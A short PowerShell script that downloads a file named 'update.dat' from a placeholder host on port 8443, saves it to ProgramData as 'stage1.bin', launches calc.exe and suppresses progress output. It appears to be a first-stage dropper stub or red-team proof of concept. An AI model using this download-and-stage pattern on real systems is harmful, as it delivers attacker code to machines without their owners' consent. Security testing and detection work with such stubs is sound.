[CmdletBinding()]
param(
    [string]$FetchUrl = 'https://example.com:8443/assets/update.dat',
    [string]$OutputPath = "C:\ProgramData\stage1.bin"
)
(New-Object System.Net.WebClient).DownloadFile($FetchUrl, $OutputPath)
Start-Process -FilePath 'calc.exe'
$ProgressPreference = "SilentlyContinue"
